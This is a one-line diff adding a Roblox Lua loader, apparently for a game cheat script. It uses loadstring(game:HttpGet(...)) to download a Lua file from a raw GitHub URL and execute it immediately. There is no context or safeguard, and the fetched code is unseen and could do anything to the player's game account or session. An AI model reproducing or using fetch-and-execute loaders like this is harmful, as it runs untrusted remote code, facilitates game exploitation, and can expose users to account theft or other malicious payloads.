@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/tha-bronx-3-spam2-157r9el2o9mrl0.lua"))()
